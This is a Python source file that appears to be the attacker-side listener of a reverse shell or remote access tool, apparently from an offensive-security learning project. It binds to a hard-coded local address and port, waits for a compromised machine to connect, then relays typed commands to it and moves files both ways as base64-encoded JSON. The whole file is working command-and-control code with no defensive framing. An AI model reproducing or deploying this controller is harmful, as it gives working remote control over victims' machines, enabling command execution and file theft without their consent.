import socket
import simplejson
import base64

class SocketListener():
    def __init__(self, host, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)  
        listener.bind((host, port))
        listener.listen(1)  
        print("Listening...")
        (self.Connection,address) = listener.accept()  
        print("Connected to ip " + str(address[0]) + " and to port " + str(address[1]))

    def save_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "Download OK"

    def get_file_contents(self,path):# upload islemi için
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        return self.Connection.send(json_data.encode("utf-8"))

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.Connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command_executer(self, command_input):

        self.json_send(command_input)  
        if command_input[0] == "quit": 
            self.Connection.close()
            print("Connection closed")
            exit()
        return self.json_recv() 

    def start_listener(self):
        while True:
            command_input = input("[mksec]>> ")
            command_input = command_input.split(" ")  
            try:
                if command_input[0] == "upload":
                    file_content = self.get_file_contents(command_input[1])
                    command_input.append(file_content)
                command_output = self.command_executer(command_input) 
                                                                    
                if command_input[0] == "download" and "Error!" not in command_output:  
                    command_output = self.save_file(command_input[1], command_output)
            except Exception:
                command_output="Error!"

            print(command_output)

SocketListener = SocketListener("192.168.76.128", 8080) # required
SocketListener.start_listener()